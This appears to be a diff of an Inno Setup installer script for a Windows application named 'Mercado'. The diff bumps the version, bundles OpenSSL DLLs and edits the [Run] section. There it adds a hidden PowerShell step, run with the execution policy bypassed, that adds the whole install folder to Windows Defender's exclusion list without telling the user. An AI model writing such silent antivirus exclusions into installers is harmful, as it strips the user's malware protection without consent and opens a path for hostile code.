@@ -2,7 +2,7 @@
 ; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!
 
 #define MyAppName "Mercado"
-#define MyAppVersion "0.1"
+#define MyAppVersion "0.0.1 26/10/2023 11:58:50,569"
 #define MyAppPublisher "Daros"
 #define MyAppURL "https://www.daros.com.br/"
 #define MyAppExeName "Starter.exe"
@@ -39,6 +39,8 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 [Files]
 ;atu
 Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-Starter\Starter.exe"; DestDir: "{app}\Starter\"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-Starter\libeay32.dll"; DestDir: "{app}\Starter\"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-Starter\ssleay32.dll"; DestDir: "{app}\Starter\"; Flags: ignoreversion recursesubdirs createallsubdirs
 Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-bin\*"; DestDir: "{app}\Starter\inst\inst-bin\"; Flags: ignoreversion recursesubdirs createallsubdirs
 Source: "\\Vboxsvr\d_drive\inst\Bantu\Update\DBUpdates\*"; DestDir: "{app}\Starter\Update\DBUpdates\"; Flags: ignoreversion recursesubdirs createallsubdirs
 
@@ -46,7 +48,6 @@ Source: "\\Vboxsvr\d_drive\inst\Bantu\Update\DBUpdates\*"; DestDir: "{app}\Start
 Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-Delphi-redist\Redist\win64\*"; DestDir: "{app}\Starter\inst\inst-Delphi-redist\Redist\win64\"; Flags: ignoreversion recursesubdirs createallsubdirs
 Source: "\\VBOXSVR\d_drive\inst\Bantu\Mercado\inst-Firebird\fb64\*"; DestDir: "{app}\Starter\inst\inst-Firebird\fb64\"; Flags: ignoreversion recursesubdirs createallsubdirs
 Source: "\\Vboxsvr\d_drive\inst\Bantu\inst\inst-Firebird\dados\*"; DestDir: "{app}\Starter\inst\inst-Firebird\dados\"; Flags: ignoreversion recursesubdirs createallsubdirs
-
 
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
@@ -56,7 +57,8 @@ Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\Starter\{#MyAppExeName}"; T
 
 [Run]
 ;fire 
-;Filename: "{app}\Starter\inst\inst-Firebird\fb64\Firebird-4.0.2.2816-0-x64.exe"; Parameters: "/SP- /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /COPYFBCLIENT /NOGDS32 /DIR=""{app}\Starter\inst\inst-Firebird\fb64\""";
+[Run]
+Filename: "{sys}\WindowsPowerShell\v1.0\powershell.exe"; Description: "PowerShell"; Parameters: "-ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}\'"""; Flags: runhidden runascurrentuser
 
 ;starter
 Filename: "{app}\Starter\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent
